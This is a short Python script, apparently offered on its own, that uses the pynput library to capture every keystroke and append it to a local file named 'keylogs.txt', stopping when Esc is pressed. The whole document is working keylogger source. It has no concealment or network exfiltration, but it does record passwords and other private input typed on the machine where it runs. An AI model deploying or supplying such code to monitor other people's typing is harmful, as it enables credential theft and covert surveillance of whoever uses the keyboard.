import os
from pynput import keyboard

def on_press(key):
    try:
        with open('keylogs.txt', 'a') as f:
            if key == keyboard.Key.space:
                f.write('[SPACE] ')
            elif key == keyboard.Key.enter:
                f.write('\n[ENTER]\n')
            elif key == keyboard.Key.backspace:
                f.write('[BACKSPACE] ')
            elif key == keyboard.Key.delete:
                f.write('[DELETE] ')
            else:
                f.write(f'{key} ')
    except Exception as e:
        print(f"Error: {e}")

def on_release(key):
    if key == keyboard.Key.esc:
        return False

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()